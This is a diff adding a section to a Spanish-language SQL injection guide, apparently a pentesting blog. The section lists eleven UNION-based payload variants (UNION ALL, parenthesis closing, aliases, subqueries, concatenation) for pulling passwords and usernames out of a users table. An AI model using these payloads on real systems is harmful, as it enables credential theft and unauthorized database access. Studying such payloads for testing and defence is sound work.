@@ -733,6 +733,54 @@ Con esa contraseña obtenida es posible acceder al usuario root con ```su root``
     ' UNION SELECT colname, NULL FROM syscat.columns WHERE tabname = 'nombre de tabla' AND tabschema = current schema--
     ```
 
+#### Formas de consultar el contenido de las columnas
+
+* Estándar
+    ```sql
+    ' UNION SELECT password, username FROM users--
+    ```
+* UNION ALL
+    ```sql
+    ' UNION ALL SELECT password, username FROM users--
+    ```
+* Cerrando un paréntesis antes de la unión
+    ```sql
+    ') UNION SELECT password, username FROM users--
+    ```
+* Uso de comillas dobles para los nombres de columna (dependiendo del DBMS)
+    ```sql
+    ' UNION SELECT "password", "username" FROM users--
+    ```
+*  Asignación de alias a la tabla
+    ```sql
+    ' UNION SELECT u.password, u.username FROM users u--
+    ```
+* Asignación de alias a las columnas
+    ```sql
+    ' UNION SELECT password AS p, username AS u FROM users--
+    ```
+* Uso de subconsulta
+    ```sql
+    ' UNION (SELECT password, username FROM users)--
+    ```
+* Cerrando un paréntesis antes de la unión con subconsulta
+    ```sql
+    ') UNION (SELECT password, username FROM users)--
+    ```
+* Uso de UNION SELECT múltiple
+    ```sql
+    ' UNION SELECT password FROM users UNION SELECT username FROM users--
+    ```
+* Concatenación de columnas (si el DBMS lo soporta)
+    ```sql
+    ' UNION SELECT 1, password || ' ' || username FROM users--
+    ```
+* Uso de UNION con selecciones nulas:
+    ```sql
+    ' UNION SELECT password, NULL FROM users UNION SELECT NULL, username FROM users--
+    ```
+
+
 > Recordar que con [ORDER BY](https://nptg24.github.io/sql-inject/#identificar-n%C3%BAmero-de-columnas) se identifica el número de columnas.
     
 ### Recomendaciones
